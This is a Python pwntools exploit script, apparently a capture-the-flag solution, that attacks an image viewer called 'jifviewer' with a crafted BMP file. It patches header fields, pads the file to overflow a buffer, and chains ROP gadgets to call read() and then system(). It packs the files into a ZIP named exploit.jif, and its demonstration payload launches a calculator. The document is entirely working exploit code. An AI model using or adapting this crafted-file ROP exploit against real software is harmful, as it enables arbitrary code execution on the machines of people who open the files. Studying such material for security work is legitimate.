import os
from pwn import *
with open("0.bmp", "r") as f:
	data = f.read(0x36)

def write(d, off, val, sz):
	d = list(d)
	for i in xrange(sz):
		d[off+i] = p32(val)[i]
	return "".join(d)

e = ELF("./jifviewer")
context.arch = "amd64"

rdi = next(e.search(asm("pop rdi; ret")))
rsi = next(e.search(asm("pop rsi; pop r15; ret")))
rop = ""
rop+= p64(rdi)
rop+= p64(8)
rop+= p64(rsi)
rop+= p64(0x0000000000602800)*2
rop+= p64(e.symbols["read"])
rop+= p64(rdi)
rop+= p64(0x0000000000602800)
rop+= p64(e.symbols["system"])
rop+= p64(e.symbols["exit"])

data = write(data, 14+4, 0x330,  4)
data = write(data, 14+8, 0x1  , 4)
data += "A"*2100
data += p32(0)
data += "B"*46
data += p32(0)
data += "C"*158
data += rop
data += "D"*56
data += "gnome-calculator"

with open("2.bmp", "w") as f:
	f.write(data)

os.system("zip exploit.jif 0.bmp 1.bmp 2.bmp")
